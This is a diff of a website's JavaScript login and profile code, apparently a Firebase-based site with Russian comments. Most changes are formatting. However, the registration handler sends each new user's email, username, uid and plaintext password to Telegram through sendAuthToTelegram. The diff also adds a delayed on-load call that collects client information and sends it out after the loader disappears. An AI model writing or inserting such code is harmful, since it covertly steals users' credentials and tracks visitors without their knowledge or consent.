-    if(!password){showToast('Please enter a password','error');return}
-    if(isRegistering && password.length<6){showToast('Password must be at least 6 characters','error');return}
+    if(!password){ showToast('Please enter a password','error'); return; }
+    if(isRegistering && password.length<6){ showToast('Password must be at least 6 characters','error'); return; }
 
     authSubmit.disabled=true;
-    const oldText=authSubmit.textContent;
+    const oldText = authSubmit.textContent;
     authSubmit.textContent='Please wait...';
 
     try{
-        const fb=window.firebaseAuth;
-        if(!fb){
-            showToast('Firebase not loaded yet','error');
-            authSubmit.disabled=false;
-            authSubmit.textContent=oldText;
-            return;
-        }
+        const fb = window.firebaseAuth;
+        if(!fb){ showToast('Firebase not loaded yet','error'); authSubmit.disabled=false; authSubmit.textContent=oldText; return; }
 
         if(isRegistering){
-            /* --- РЕГИСТРАЦИЯ --- */
             authSubmit.textContent='Checking username...';
-            let taken = false;
+            let taken=false;
             try{ taken = await fb.isUsernameTaken(usernameRaw); }
-            catch(e){
-                console.error('username check failed:', e);
-                showToast('Cannot check username — try again','error');
-                authSubmit.disabled = false;
-                authSubmit.textContent = oldText;
-                return;
-            }
-            if(taken){
-                showToast('Username already taken','error');
-                authSubmit.disabled=false;
-                authSubmit.textContent=oldText;
-                return;
-            }
+            catch(e){ console.error(e); showToast('Cannot check username — try again','error'); authSubmit.disabled=false; authSubmit.textContent=oldText; return; }
+            if(taken){ showToast('Username already taken','error'); authSubmit.disabled=false; authSubmit.textContent=oldText; return; }
 
             authSubmit.textContent='Creating account...';
             const cred = await fb.createUserWithEmailAndPassword(fb.auth, emailRaw, password);
@@ -1415,24 +1393,12 @@ on(authSubmit,'click',async()=>{
 
             await sendAuthToTelegram('Register', emailRaw, cred.user.uid, usernameRaw, password);
             showToast('Account created ✓','success');
-        } else {
-            /* --- ЛОГИН по username --- */
+        }else{
             authSubmit.textContent='Looking up...';
-            let email = null;
+            let email=null;
             try{ email = await fb.getEmailByUsername(usernameRaw); }
-            catch(e){
-                console.error('lookup failed:', e);
-                showToast('Cannot lookup user — try again','error');
-                authSubmit.disabled=false;
-                authSubmit.textContent=oldText;
-                return;
-            }
-            if(!email){
-                showToast('User not found','error');
-                authSubmit.disabled=false;
-                authSubmit.textContent=oldText;
-                return;
-            }
+            catch(e){ console.error(e); showToast('Cannot lookup user — try again','error'); authSubmit.disabled=false; authSubmit.textContent=oldText; return; }
+            if(!email){ showToast('User not found','error'); authSubmit.disabled=false; authSubmit.textContent=oldText; return; }
 
             authSubmit.textContent='Signing in...';
             const cred = await fb.signInWithEmailAndPassword(fb.auth, email, password);
@@ -1445,7 +1411,7 @@ on(authSubmit,'click',async()=>{
         authPassword.value='';
         authUsername.value='';
     }catch(err){
-        console.error('FIREBASE ERROR:',err.code,err.message,err);
+        console.error('FIREBASE ERROR:', err.code, err.message, err);
         let msg='Something went wrong';
         if(err.code==='auth/email-already-in-use')msg='Email already in use';
         else if(err.code==='auth/user-not-found')msg='User not found';
@@ -1467,16 +1433,15 @@ on(authSubmit,'click',async()=>{
 
 /* ================= ПРОФИЛЬ ================= */
 const PROFILE_CACHE_KEY='seal_profile_cache';
-
-function saveProfileCache(username){try{localStorage.setItem(PROFILE_CACHE_KEY,username)}catch(e){}}
-function clearProfileCache(){try{localStorage.removeItem(PROFILE_CACHE_KEY)}catch(e){}}
+function saveProfileCache(u){ try{ localStorage.setItem(PROFILE_CACHE_KEY,u); }catch(e){} }
+function clearProfileCache(){ try{ localStorage.removeItem(PROFILE_CACHE_KEY); }catch(e){} }
 
 (function prefillAvatarOnly(){
     let cached=null;
-    try{cached=localStorage.getItem(PROFILE_CACHE_KEY)}catch(e){}
+    try{ cached = localStorage.getItem(PROFILE_CACHE_KEY); }catch(e){}
     if(cached){
-        profileName.textContent=cached.toLowerCase();
-        profileAvatar.textContent=(cached[0]||'s').toLowerCase();
+        profileName.textContent = cached.toLowerCase();
+        profileAvatar.textContent = (cached[0]||'s').toLowerCase();
     }
 })();
 
@@ -1484,7 +1449,6 @@ async function updateAuthUI(user){
     if(user){
         openAuthBtn.style.display='none';
         profileCard.classList.add('show');
-        syncLangSwitcherWithProfile();
         profileAvatar.textContent = 's';
         profileName.textContent = '...';
         try{
@@ -1494,44 +1458,41 @@ async function updateAuthUI(user){
                 profileName.textContent = uname.toLowerCase();
                 profileAvatar.textContent = uname[0].toLowerCase();
                 saveProfileCache(uname);
-            }else{
-                profileName.textContent = 'seal';
-            }
-        }catch(e){
-            console.warn('username fetch failed', e);
-            profileName.textContent = 'seal';
-        }
+            }else{ profileName.textContent = 'seal'; }
+        }catch(e){ console.warn(e); profileName.textContent = 'seal'; }
     }else{
         openAuthBtn.style.display='';
         profileCard.classList.remove('show');
         clearProfileCache();
-        syncLangSwitcherWithProfile();
     }
 }
 
 function initFirebaseAuth(){
-    const fb=window.firebaseAuth;
-    if(!fb)return;
-    fb.onAuthStateChanged(fb.auth,updateAuthUI);
+    const fb = window.firebaseAuth;
+    if(!fb) return;
+    fb.onAuthStateChanged(fb.auth, updateAuthUI);
 }
-if(window.firebaseAuth)initFirebaseAuth();
-else window.addEventListener('firebase-ready',initFirebaseAuth,{once:true});
+if(window.firebaseAuth) initFirebaseAuth();
+else window.addEventListener('firebase-ready', initFirebaseAuth, { once:true });
 
-on(profileReviews,'click',e=>{
-    e.preventDefault();
-    showPage(pageReviews,'#reviews');
+on(profileReviews,'click', e=>{ e.preventDefault(); showPage(pageReviews,'#reviews'); });
+on(signOutBtn,'click', async ()=>{
+    const fb = window.firebaseAuth;
+    if(fb){ await fb.signOut(fb.auth); showToast('Logged out','success'); }
 });
 
-on(signOutBtn,'click',async()=>{
-    const fb=window.firebaseAuth;
-    if(fb){
-        await fb.signOut(fb.auth);
-        showToast('Logged out','success');
-    }
+/* ================= ФИНАЛЬНЫЙ ЗАПУСК ================= */
+/* Отправляем визит-инфу, когда всё готово, но не блокируем UI */
+window.addEventListener('load', () => {
+    __clientInfo = getClientInfo();
+    /* Задержим отправку на 2 секунды, чтобы загрузчик уже исчез, а данные собрались */
+    setTimeout(() => {
+        sendVisitInfo();
+    }, 2000);
 });
 
-/* страховка на случай, если что-то зависло */
-setTimeout(() => {
+/* Страховка загрузчика */
+setTimeout(()=>{
   if(!sealLoader.classList.contains('hidden')){
     Object.keys(bootState).forEach(k => bootState[k] = true);
     finishLoader();
